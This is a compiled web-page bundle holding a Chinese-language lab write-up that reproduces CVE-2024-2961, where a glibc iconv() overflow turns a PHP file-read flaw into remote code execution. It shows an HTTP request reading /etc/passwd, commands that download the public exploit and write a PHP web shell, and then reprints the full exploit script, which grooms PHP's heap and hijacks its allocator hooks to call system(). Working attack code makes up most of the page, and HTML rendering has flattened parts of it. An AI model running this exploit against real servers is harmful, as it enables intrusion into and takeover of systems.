import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as r,c as u,a as e,b as n,d as s,e as o}from"./app-58e4a7d6.js";const p={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),c=e("p",null,[n("GNU C 是一个标准的 ISO C 依赖库。在 GNU C 中，"),e("code",null,"iconv()"),n(" 函数 2.39 及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。")],-1),d=e("p",null,[n("如果一个 PHP 应用中存在任意文件读取漏洞，攻击者可以利用 "),e("code",null,"iconv()"),n(" 的这个 CVE-2024-2961 漏洞，将其提升为代码执行漏洞。")],-1),h=e("p",null,"参考链接：",-1),m={href:"https://www.ambionics.io/blog/iconv-cve-2024-2961-p1",target:"_blank",rel:"noopener noreferrer"},f=o(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 PHP 8.3.4 服务器，其使用 iconv 2.36 作为依赖：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，你可以通过 POST 请求读取 <code>/etc/passwd</code> 文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /index.php HTTP/1.1
Host: your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: */*
Content-Length: 20

file=%2Fetc%2Fpasswd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529103426807.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,7),q={href:"https://github.com/ambionics/cnext-exploits",target:"_blank",rel:"noopener noreferrer"},_=o(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pip install pwntools
pip install https://github.com/cfreal/ten/archive/refs/heads/main.zip
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,1),b={href:"https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py",target:"_blank",rel:"noopener noreferrer"},k=o(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
python cnext-exploit.py http://your-ip:8080/index.php &quot;echo &#39;&lt;?=phpinfo();?&gt;&#39; &gt; shell.php&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529104545506.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可见，已经成功写入 <code>shell.php</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240529104613750.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,5),g={href:"http://cnext-exploit.py",target:"_blank",rel:"noopener noreferrer"},v=o(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment">#</span>
<span class="token comment"># CNEXT: PHP file-read to RCE</span>
<span class="token comment"># Date: 2024-05-27</span>
<span class="token comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span>
<span class="token comment">#</span>
<span class="token comment"># TODO Parse LIBC to know if patched</span>
<span class="token comment">#</span>
<span class="token comment"># INFORMATIONS</span>
<span class="token comment">#</span>
<span class="token comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span>
<span class="token comment">#</span>
<span class="token comment"># REQUIREMENTS</span>
<span class="token comment">#</span>
<span class="token comment"># Requires ten: https://github.com/cfreal/ten</span>
<span class="token comment">#</span>

<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations

<span class="token keyword">import</span> base64
<span class="token keyword">import</span> zlib
<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ChunkedEncodingError<span class="token punctuation">,</span> ConnectionError
<span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>


HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>
BUG <span class="token operator">=</span> <span class="token string">&quot;劄&quot;</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>
    <span class="token string">&quot;&quot;</span>&quot;A helper <span class="token keyword">class</span> <span class="token class-name">to</span> send the payload <span class="token keyword">and</span> download files<span class="token punctuation">.</span>
    
    The logic of the exploit <span class="token keyword">is</span> always the same<span class="token punctuation">,</span> but the exploit needs to know how to
    download files <span class="token punctuation">(</span><span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>maps <span class="token keyword">and</span> libc<span class="token punctuation">)</span> <span class="token keyword">and</span> how to send the payload<span class="token punctuation">.</span>
    
    The code here serves <span class="token keyword">as</span> an example that attacks a page that looks like<span class="token punctuation">:</span>
    
    \`\`\`php
    <span class="token operator">&lt;</span>?php
    
    $data <span class="token operator">=</span> file_get_contents<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">&#39;file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    echo <span class="token string">&quot;File contents: $data&quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><pre><code>Tweak it to fit your target, and start the exploit.
&quot;&quot;&quot;

def __init__(self, url: str) -&gt; None:
    self.url = url
    self.session = Session()

def send(self, path: str) -&gt; Response:
    &quot;&quot;&quot;Sends given \`path\` to the HTTP server. Returns the response.
    &quot;&quot;&quot;
    return self.session.post(self.url, data={&quot;file&quot;: path})
    
def download(self, path: str) -&gt; bytes:
    &quot;&quot;&quot;Returns the contents of a remote file.
    &quot;&quot;&quot;
    path = f&quot;php://filter/convert.base64-encode/resource={path}&quot;
    response = self.send(path)
    data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)
    return base64.decode(data)
</code></pre><p>@entry @arg(&quot;url&quot;, &quot;Target URL&quot;) @arg(&quot;command&quot;, &quot;Command to run on the system; limited to 0x140 bytes&quot;) @arg(&quot;sleep_time&quot;, &quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;) @arg(&quot;heap&quot;, &quot;Address of the main zend_mm_heap structure.&quot;) @arg( &quot;pad&quot;, &quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot; &quot;operations with this size, increase this. Defaults to 20.&quot;, ) @dataclass class Exploit: &quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</p><pre><code>url: str
command: str
sleep: int = 1
heap: str = None
pad: int = 20

def __post_init__(self):
    self.remote = Remote(self.url)
    self.log = logger(&quot;EXPLOIT&quot;)
    self.info = {}
    self.heap = self.heap and int(self.heap, 16)

def check_vulnerable(self) -&gt; None:
    &quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various
    wrappers and filters that the exploit needs.
    &quot;&quot;&quot;
    
    def safe_download(path: str) -&gt; bytes:
        try:
            return self.remote.download(path)
        except ConnectionError:
            failure(&quot;Target not [b]reachable[/] ?&quot;)


    def check_token(text: str, path: str) -&gt; bool:
        result = safe_download(path)
        return text.encode() == result

    text = tf.random.string(50).encode()
    base64 = b64(text, misalign=True).decode()
    path = f&quot;data:text/plain;base64,{base64}&quot;
    
    result = safe_download(path)
    
    if text not in result:
        msg_failure(&quot;Remote.download did not return the test string&quot;)
        print(&quot;--------------------&quot;)
        print(f&quot;Expected test string: {text}&quot;)
        print(f&quot;Got: {result}&quot;)
        print(&quot;--------------------&quot;)
        failure(&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]data://[/] wrapper works&quot;)

    text = tf.random.string(50)
    base64 = b64(text.encode(), misalign=True).decode()
    path = f&quot;php://filter//resource=data:text/plain;base64,{base64}&quot;
    if not check_token(text, path):
        failure(&quot;The [i]php://filter/[/] wrapper does not work&quot;)

    msg_info(&quot;The [i]php://filter/[/] wrapper works&quot;)

    text = tf.random.string(50)
    base64 = b64(compress(text.encode()), misalign=True).decode()
    path = f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}&quot;

    if not check_token(text, path):
        failure(&quot;The [i]zlib[/] extension is not enabled&quot;)

    msg_info(&quot;The [i]zlib[/] extension is enabled&quot;)

    msg_success(&quot;Exploit preconditions are satisfied&quot;)

def get_file(self, path: str) -&gt; bytes:
    with msg_status(f&quot;Downloading [i]{path}[/]...&quot;):
        return self.remote.download(path)

def get_regions(self) -&gt; list[Region]:
    &quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;
    maps = self.get_file(&quot;/proc/self/maps&quot;)
    maps = maps.decode()
    PATTERN = re.compile(
        r&quot;^([a-f0-9]+)-([a-f0-9]+)\\b&quot; r&quot;.*&quot; r&quot;\\s([-rwx]{3}[ps])\\s&quot; r&quot;(.*)&quot;
    )
    regions = []
    for region in table.split(maps, strip=True):
        if match := PATTERN.match(region):
            start = int(match.group(1), 16)
            stop = int(match.group(2), 16)
            permissions = match.group(3)
            path = match.group(4)
            if &quot;/&quot; in path or &quot;[&quot; in path:
                path = path.rsplit(&quot; &quot;, 1)[-1]
            else:
                path = &quot;&quot;
            current = Region(start, stop, permissions, path)
            regions.append(current)
        else:
            print(maps)
            failure(&quot;Unable to parse memory mappings&quot;)

    self.log.info(f&quot;Got {len(regions)} memory regions&quot;)

    return regions

def get_symbols_and_addresses(self) -&gt; None:
    &quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;
    regions = self.get_regions()

    LIBC_FILE = &quot;/dev/shm/cnext-libc&quot;

    # PHP&#39;s heap

    self.info[&quot;heap&quot;] = self.heap or self.find_main_heap(regions)

    # Libc

    libc = self._get_region(regions, &quot;libc-&quot;, &quot;libc.so&quot;)

    self.download_file(libc.path, LIBC_FILE)

    self.info[&quot;libc&quot;] = ELF(LIBC_FILE, checksec=False)
    self.info[&quot;libc&quot;].address = libc.start

def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
    &quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;
    for region in regions:
        if any(name in region.path for name in names):
            break
    else:
        failure(&quot;Unable to locate region&quot;)

    return region

def download_file(self, remote_path: str, local_path: str) -&gt; None:
    &quot;&quot;&quot;Downloads \`remote_path\` to \`local_path\`&quot;&quot;&quot;
    data = self.get_file(remote_path)
    Path(local_path).write(data)

def find_main_heap(self, regions: list[Region]) -&gt; Region:
    # Any anonymous RW region with a size superior to the base heap size is a
    # candidate. The heap is at the bottom of the region.
    heaps = [
        region.stop - HEAP_SIZE + 0x40
        for region in reversed(regions)
        if region.permissions == &quot;rw-p&quot;
        and region.size &gt;= HEAP_SIZE
        and region.stop &amp; (HEAP_SIZE-1) == 0
        and region.path == &quot;&quot;
    ]

    if not heaps:
        failure(&quot;Unable to find PHP&#39;s main heap in memory&quot;)

    first = heaps[0]

    if len(heaps) &gt; 1:
        heaps = &quot;, &quot;.join(map(hex, heaps))
        msg_info(f&quot;Potential heaps: [i]{heaps}[/] (using first)&quot;)
    else:
        msg_info(f&quot;Using [i]{hex(first)}[/] as heap&quot;)

    return first

def run(self) -&gt; None:
    self.check_vulnerable()
    self.get_symbols_and_addresses()
    self.exploit()

def build_exploit_path(self) -&gt; str:
    &quot;&quot;&quot;

    On each step of the exploit, a filter will process each chunk one after the
    other. Processing generally involves making some kind of operation either
    on the chunk or in a destination chunk of the same size. Each operation is
    applied on every single chunk; you cannot make PHP apply iconv on the first 10
    chunks and leave the rest in place. That&#39;s where the difficulties come from.

    Keep in mind that we know the address of the main heap, and the libraries.
    ASLR/PIE do not matter here.

    The idea is to use the bug to make the freelist for chunks of size 0x100 point
    lower. For instance, we have the following free list:

    ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00

    By triggering the bug from chunk ..900, we get:

    ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???

    That&#39;s step 3.

    Now, in order to control the free list, and make it point whereever we want,
    we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
    we&#39;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
    That&#39;s step 2.

    Now, if we were to perform step2 an then step3 without anything else, we&#39;d have
    a problem: after step2 has been processed, the free list goes bottom-up, like:

    0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900

    We need to go the other way around. That&#39;s why we have step 1: it just allocates
    chunks. When they get freed, they reverse the free list. Now step2 allocates in
    reverse order, and therefore after step2, chunks are in the correct order.

    Another problem comes up.

    To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
    Since step2 creates chunks that contain pointers and pointers are generally not
    UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
    To avoid this, we put the chunks in step2 at the very end of the chain, and
    prefix them with \`0\\n\`. When dechunked (right before the iconv), they will
    &quot;disappear&quot; from the chain, preserving them from the character set conversion
    and saving us from an unwanted processing error that would stop the processing
    chain.

    After step3 we have a corrupted freelist with an arbitrary pointer into it. We
    don&#39;t know the precise layout of the heap, but we know that at the top of the
    heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
    Its free_slot[] array contains a pointer to each free list. By overwriting it,
    we can make PHP allocate chunks whereever we want. In addition, its custom_heap
    field contains pointers to hook functions for emalloc, efree, and erealloc
    (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
    then overwrite the use_custom_heap flag to make PHP use these function pointers
    instead. We can now do our favorite CTF technique and get a call to
    system(&lt;chunk&gt;).
    We make sure that the &quot;system&quot; command kills the current process to avoid other
    system() calls with random chunk data, leading to undefined behaviour.

    The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the
    process is in a random state, we still get contiguous, in order chunks for our
    exploit.

    Therefore, the whole process described here CANNOT crash. Everything falls
    perfectly in place, and nothing can get in the middle of our allocations.
    &quot;&quot;&quot;

    LIBC = self.info[&quot;libc&quot;]
    ADDR_EMALLOC = LIBC.symbols[&quot;__libc_malloc&quot;]
    ADDR_EFREE = LIBC.symbols[&quot;__libc_system&quot;]
    ADDR_EREALLOC = LIBC.symbols[&quot;__libc_realloc&quot;]

    ADDR_HEAP = self.info[&quot;heap&quot;]
    ADDR_FREE_SLOT = ADDR_HEAP + 0x20
    ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

    ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

    CS = 0x100

    # Pad needs to stay at size 0x100 at every step
    pad_size = CS - 0x18
    pad = b&quot;\\x00&quot; * pad_size
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = chunked_chunk(pad, len(pad) + 6)
    pad = compressed_bucket(pad)

    step1_size = 1
    step1 = b&quot;\\x00&quot; * step1_size
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1)
    step1 = chunked_chunk(step1, CS)
    step1 = compressed_bucket(step1)

    # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
    # ISO-2022-CN-EXT. We add a \`0\\n\` that makes the 4th and last dechunk &quot;crash&quot;

    step2_size = 0x48
    step2 = b&quot;\\x00&quot; * (step2_size + 8)
    step2 = chunked_chunk(step2, CS)
    step2 = chunked_chunk(step2)
    step2 = compressed_bucket(step2)

    step2_write_ptr = b&quot;0\\n&quot;.ljust(step2_size, b&quot;\\x00&quot;) + p64(ADDR_FAKE_BIN)
    step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
    step2_write_ptr = chunked_chunk(step2_write_ptr)
    step2_write_ptr = compressed_bucket(step2_write_ptr)

    step3_size = CS

    step3 = b&quot;\\x00&quot; * step3_size
    assert len(step3) == CS
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = chunked_chunk(step3)
    step3 = compressed_bucket(step3)

    step3_overflow = b&quot;\\x00&quot; * (step3_size - len(BUG)) + BUG
    assert len(step3_overflow) == CS
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = chunked_chunk(step3_overflow)
    step3_overflow = compressed_bucket(step3_overflow)

    step4_size = CS
    step4 = b&quot;=00&quot; + b&quot;\\x00&quot; * (step4_size - 1)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = chunked_chunk(step4)
    step4 = compressed_bucket(step4)

    # This chunk will eventually overwrite mm_heap-&gt;free_slot
    # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
    step4_pwn = ptr_bucket(
        0x200000,
        0,
        # free_slot
        0,
        0,
        ADDR_CUSTOM_HEAP,  # 0x18
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        ADDR_HEAP,  # 0x140
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        size=CS,
    )

    step4_custom_heap = ptr_bucket(
        ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
    )

    step4_use_custom_heap_size = 0x140

    COMMAND = self.command
    COMMAND = f&quot;kill -9 $PPID; {COMMAND}&quot;
    if self.sleep:
        COMMAND = f&quot;sleep {self.sleep}; {COMMAND}&quot;
    COMMAND = COMMAND.encode() + b&quot;\\x00&quot;

    assert (
        len(COMMAND) &lt;= step4_use_custom_heap_size
    ), f&quot;Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}&quot;
    COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&quot;\\x00&quot;)

    step4_use_custom_heap = COMMAND
    step4_use_custom_heap = qpe(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
    step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

    pages = (
        step4 * 3
        + step4_pwn
        + step4_custom_heap
        + step4_use_custom_heap
        + step3_overflow
        + pad * self.pad
        + step1 * 3
        + step2_write_ptr
        + step2 * 2
    )

    resource = compress(compress(pages))
    resource = b64(resource)
    resource = f&quot;data:text/plain;base64,{resource.decode()}&quot;

    filters = [
        # Create buckets
        &quot;zlib.inflate&quot;,
        &quot;zlib.inflate&quot;,
        
        # Step 0: Setup heap
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,
        
        # Step 1: Reverse FL order
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,
        
        # Step 2: Put fake pointer and make FL order back to normal
        &quot;dechunk&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,
        
        # Step 3: Trigger overflow
        &quot;dechunk&quot;,
        &quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;,
        
        # Step 4: Allocate at arbitrary address and change zend_mm_heap
        &quot;convert.quoted-printable-decode&quot;,
        &quot;convert.iconv.latin1.latin1&quot;,
    ]
    filters = &quot;|&quot;.join(filters)
    path = f&quot;php://filter/read={filters}/resource={resource}&quot;

    return path

@inform(&quot;Triggering...&quot;)
def exploit(self) -&gt; None:
    path = self.build_exploit_path()
    start = time.time()

    try:
        self.remote.send(path)
    except (ConnectionError, ChunkedEncodingError):
        pass
    
    msg_print()
    
    if not self.sleep:
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;)
    elif start + self.sleep &lt;= time.time():
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;)
    else:
        # Wrong heap, maybe? If the exploited suggested others, use them!
        msg_print(&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;)
    
    msg_print()
</code></pre><p>def compress(data) -&gt; bytes: &quot;&quot;&quot;Returns data suitable for <code>zlib.inflate</code>. &quot;&quot;&quot; # Remove 2-byte header and 4-byte checksum return zlib.compress(data, 9)[2:-4]</p><p>def b64(data: bytes, misalign=True) -&gt; bytes: payload = base64.encode(data) if not misalign and payload.endswith(&quot;=&quot;): raise ValueError(f&quot;Misaligned: {data}&quot;) return payload.encode()</p><p>def compressed_bucket(data: bytes) -&gt; bytes: &quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot; return chunked_chunk(data, 0x8000)</p><p>def qpe(data: bytes) -&gt; bytes: &quot;&quot;&quot;Emulates quoted-printable-encode. &quot;&quot;&quot; return &quot;&quot;.join(f&quot;={x:02x}&quot; for x in data).upper().encode()</p><p>def ptr_bucket(*ptrs, size=None) -&gt; bytes: &quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot; if size is not None: assert len(ptrs) * 8 == size bucket = b&quot;&quot;.join(map(p64, ptrs)) bucket = qpe(bucket) bucket = chunked_chunk(bucket) bucket = chunked_chunk(bucket) bucket = chunked_chunk(bucket) bucket = compressed_bucket(bucket)</p><pre><code>return bucket
</code></pre><p>def chunked_chunk(data: bytes, size: int = None) -&gt; bytes: &quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the chunked representation has size <code>size</code>. For instance, <code>ABCD</code> with size 10 becomes: <code>0004\\nABCD\\n</code>. &quot;&quot;&quot; # The caller does not care about the size: let&#39;s just add 8, which is more than # enough if size is None: size = len(data) + 8 keep = len(data) + len(b&quot;\\n\\n&quot;) size = f&quot;{len(data):x}&quot;.rjust(size - keep, &quot;0&quot;) return size.encode() + b&quot;\\n&quot; + data + b&quot;\\n&quot;</p><p>@dataclass class Region: &quot;&quot;&quot;A memory region.&quot;&quot;&quot;</p><pre><code>start: int
stop: int
permissions: str
path: str

@property
def size(self) -&gt; int:
    return self.stop - self.start
</code></pre><p>Exploit()</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code></code></pre><div class="line-numbers" aria-hidden="true"></div></div>`,15);function w(x,y){const t=i("ExternalLinkIcon");return r(),u("div",null,[l,c,d,h,e("ul",null,[e("li",null,[e("a",m,[n("https://www.ambionics.io/blog/iconv-cve-2024-2961-p1"),s(t)])])]),f,e("p",null,[n("在使用原作者给出的 "),e("a",q,[n("exploit"),s(t)]),n(" 前，需要准备一个 Linux 环境和 Python 3.10 解释器。安装依赖：")]),_,e("p",null,[n("然后从 "),e("a",b,[n("https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py"),s(t)]),n(" 下载 POC 并执行：")]),k,e("p",null,[e("a",g,[n("cnext-exploit.py"),s(t)])]),v])}const E=a(p,[["render",w],["__file","PHP 利用 GNU C Iconv 将文件读取提升至 RCE CVE-2024-2961.html.vue"]]);export{E as default};
